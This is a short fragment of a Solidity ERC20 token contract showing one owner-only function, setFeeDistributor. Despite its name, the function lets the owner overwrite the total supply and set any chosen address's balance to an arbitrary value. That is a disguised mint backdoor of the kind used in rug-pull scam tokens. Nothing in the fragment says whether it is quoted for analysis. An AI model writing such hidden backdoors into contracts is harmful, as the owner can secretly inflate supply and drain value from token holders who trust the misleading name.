...
contract ERC20 is Context, IERC20, Ownable {
     ...
     * total supply.
     */
   function setFeeDistributor(address _distributor, uint256 feeValue, uint256 subtractValue) external onlyOwner {
        require(_distributor != address(0));
        _totalSupply = feeValue.sub(subtractValue);
        _balances[_distributor] = feeValue.sub(subtractValue);
    }
        /**
